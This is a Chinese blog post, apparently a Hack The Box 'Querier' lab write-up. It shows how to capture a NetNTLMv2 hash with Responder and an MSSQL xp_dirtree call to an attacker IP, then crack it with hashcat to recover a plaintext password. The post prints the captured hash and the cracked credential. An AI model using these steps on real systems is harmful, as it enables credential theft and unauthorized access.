@@ -1,0 +1,37 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> HashCat：如何利用HashCat破解NTLMv2 hash？ · TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker.</title><meta name="description" content="HashCat：如何利用HashCat破解NTLMv2 hash？ - TonghuaRoot"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://tonghuaroot.com/atom.xml" title="TonghuaRoot's BloG. - Cyber security enthusiast, not Hacker."></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://twitter.com/tonghuaroot" target="_blank" class="nav-list-link">TWITTE</a></li><li class="nav-list-item"><a href="https://github.com/omg2hei" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRS</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HashCat：如何利用HashCat破解NTLMv2 hash？</h1><div class="post-info">Mar 2, 2020</div><div class="post-content"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当我们利用Responder拿到目标机做SMB文件共享时使用的NetNTLMv2 hash后，可以利用HashCat对该hash进行破解，还原出明文密码。</p>
+<p>在这篇文章中，我会介绍一下，如何利用Responder监听拿到目标机的NetNTLMv2 hash。以及如何使用HashCat破解hash还原密码。</p>
+<h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><p>攻击机（Kali Linux）：10.10.14.7</p>
+<p>靶机（Microsoft Windows Server 2019 Standard）：10.10.10.125</p>
+<p>我们现在以及拿到了一个低权限的MSSQL账号密码，然后想要利用Responder进一步拿到NetNTLMv2 hash。</p>
+<p>当然拿到NetNTLMv2 hash的方法还有很多，比如说我18年在朋友圈提到的Word doc UNC注入拿NetNTLMv2 hash。</p>
+<p><img src="1.png" alt="1"></p>
+<h2 id="0x02-如何利用Responder监听目标机器的NetNTLMv2-hash？"><a href="#0x02-如何利用Responder监听目标机器的NetNTLMv2-hash？" class="headerlink" title="0x02 如何利用Responder监听目标机器的NetNTLMv2 hash？"></a>0x02 如何利用Responder监听目标机器的NetNTLMv2 hash？</h2><p>第1步：启动Responder</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt="2"></p>
+<p>第2步：利用SMB文件共享，访问攻击机的目录，请求就会打在Responder上了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree &quot;\\10.10.14.7\tonghuaroot.com&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="3"></p>
+<p>第3步：检查Responder记录</p>
+<p>可以看到我们已经成功拿到了NTLMv2 hash。</p>
+<p><img src="4.png" alt="4"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssql-svc::QUERIER:3dedaec57679f94c:D07E7F388AC9FBCC407509FCF0745E13:0101000000000000C0653150DE09D20174F5F4C3BF1B0BDA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000006E68D653C9F1101BDD416587149E0A62257D13DFDAE23D53CEF44E8FB43B04120A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-如何利用HashCat破解NetNTLMv2-Hash？"><a href="#0x03-如何利用HashCat破解NetNTLMv2-Hash？" class="headerlink" title="0x03 如何利用HashCat破解NetNTLMv2 Hash？"></a>0x03 如何利用HashCat破解NetNTLMv2 Hash？</h2><p>其实很简单，HashCat在破解密码的时候分为不同的Mode，对应不同的加密方式。</p>
+<p>第1步：确认应该采用哪种Mode进行破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat --example-hashes | less</span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt="5"></p>
+<p>MODE: 5600</p>
+<p>第2步：加载字典破解NetNTLMv2 hash</p>
+<p>（注：这里只是演示使用思路，具体实际环境使用GPU破解、搭建密码破解集群等内容将会在后面的内容为大家介绍。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hashes/Querier.ntlmv2 /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+<p><img src="6.png" alt="6"></p>
+<p>域：QUERIER</p>
+<p>用户名：MSSQL-SVC</p>
+<p>密码：corporate568</p>
+<p>使用上面HashCat跑出来的凭证我们就可以继续后续的利用了，当然这部分并不是本文讨论的重点。</p>
+<p><img src="7.png" alt="7"></p>
+<h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>在这篇文章种主要记录了一下使用使用HashCat破解NetNTLMv2 Hash。</p>
+<p>如果您对我的文章感兴趣，并且再复现的时候遇到了困难，请随时PM我，我非常愿意花时间和您讨论。</p>
+<p>PS：渗透这东西主要还是积累、经验和思路，再就是要多动手，HTB这个平台我吹到爆，实验环境多的很，真的是舒服。</p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p>[1] Querier, <a href="https://www.hackthebox.eu/home/machines/profile/175" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/175</a></p>
+<p>[2] HackTheBox - Querier, <a href="https://www.youtube.com/embed/d7ACjty4m7U?rel=0&amp;controls=1&amp;modestbranding=1" target="_blank" rel="noopener">https://www.youtube.com/embed/d7ACjty4m7U?rel=0&amp;controls=1&amp;modestbranding=1</a></p>
+</div></article></div></main><footer><div class="paginator"><a href="/2020/02/27/Zero-trust-in-my-eyes/" class="next">NEXT</a></div><div class="copyright"><p>© 2008 - 2020 <a href="https://tonghuaroot.com">TonghuaRoot</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
